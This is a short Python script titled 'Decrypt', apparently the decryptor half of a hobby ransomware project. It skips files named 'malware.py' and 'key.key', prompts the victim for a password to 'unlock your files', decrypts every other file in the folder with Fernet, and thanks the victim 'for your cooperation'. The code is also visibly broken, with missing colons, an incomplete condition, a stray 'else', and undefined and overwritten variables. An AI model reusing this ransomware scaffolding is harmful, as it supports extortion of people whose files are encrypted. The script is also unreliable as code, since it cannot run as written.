# Decrypt 

#!/usr/bin/env python3 

import os 
from cryptography.fernet import fernet

# Find files in the working directory 

files = []

for file in os.listdir()
    if file == "malware.py" or file =="key.key" or == "decrypt.py":
        continue
    if os.path.isfile(file)
        files.append(file)
        
print(files)

key = fernet.generate_key()

with open("key.key", "rb") as key:
    secret = key.read()
    
secret = "<insert key>"
user_input = input("Enter the password to unlock your files:")
    
for file in files:
    with open(file,"rb") as thefile:
            contents = thefile.read()
    contents_encrypted = fernet(secret).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)
        
        
    print("Your files are now decrypted, thank you for your cooperation!")
    
    else:     
        
    print("") 
